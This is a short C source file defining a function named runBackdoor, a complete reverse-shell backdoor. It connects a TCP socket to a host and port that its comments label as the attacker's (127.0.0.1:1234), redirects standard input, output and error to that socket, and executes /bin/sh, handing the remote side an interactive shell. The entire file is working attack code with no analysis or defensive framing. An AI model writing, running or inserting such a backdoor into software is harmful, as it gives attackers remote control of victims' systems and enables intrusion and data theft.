#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int runBackdoor() {
  struct sockaddr_in server_address;
  int sock = 0;

  // Create socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  server_address.sin_family = AF_INET;
  server_address.sin_port = htons(1234); // Attacker's listening port

  // Convert IPv4 addresses from text to binary form
  inet_pton(AF_INET, "127.0.0.1",
            &server_address.sin_addr); // Attacker's IP address

  // Connect to the attacker's server
  connect(sock, (struct sockaddr *)&server_address, sizeof(server_address));

  // Redirect stdin, stdout, stderr to socket
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  // Execute a shell
  char *command = "/bin/sh";
  char *args[] = {command, NULL};
  execve(command, args, NULL);

  return 0;
}